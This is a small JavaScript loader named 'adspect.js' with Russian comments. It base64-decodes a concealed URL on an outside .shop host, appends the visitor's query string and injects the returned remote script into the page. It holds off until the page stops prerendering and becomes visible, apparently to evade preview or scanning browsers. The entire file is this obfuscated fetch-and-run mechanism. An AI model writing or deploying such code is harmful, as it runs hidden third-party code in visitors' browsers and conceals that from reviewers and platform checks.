// adspect.js (v1.0.1) — устойчив к prerender/preload в In-App браузерах
(function () {
  function inject() {
    try {
      var a = location;
      var head = document.head || document.getElementsByTagName('head')[0] || document.documentElement;

      // Твой PHP-эндпоинт с __sid (оставил base64 как у тебя)
      var d = atob('aHR0cHM6Ly91c2VwcmVtaXVtLnNob3AvYWpheC5waHA/X19zaWQ9NThlMWJlZTktYjAyMi00NTFkLWE4Y2ItNjFhZWUwZTY0Zjhi');

      d += (d.indexOf('?') > -1 ? '&' : '?') + a.search.substring(1 || 0);

      var s = document.createElement('script');
      s.src = d;
      try { s.id = btoa(a.origin); } catch (_) {}
      head.appendChild(s);
    } catch (e) {
      // опционально: можно отправить пиксель/лог на свой сервер
    }
  }

  // Определяем, активна ли страница сейчас
  var visibleNow = (typeof document.prerendering !== 'undefined')
    ? !document.prerendering
    : (!('visibilityState' in document) || document.visibilityState === 'visible');

  if (visibleNow) {
    inject();
  } else {
    // Ждём, пока страница станет видимой
    var onVisible = function () {
      var ready = (typeof document.prerendering !== 'undefined')
        ? !document.prerendering
        : (document.visibilityState === 'visible');

      if (ready) {
        document.removeEventListener('visibilitychange', onVisible, true);
        window.removeEventListener('pageshow', onVisible, true);
        inject();
      }
    };
    document.addEventListener('visibilitychange', onVisible, true);
    window.addEventListener('pageshow', onVisible, true);

    // Фолбэк на случай, если события не придут (некоторые WebView)
    setTimeout(inject, 1500);
  }
})();
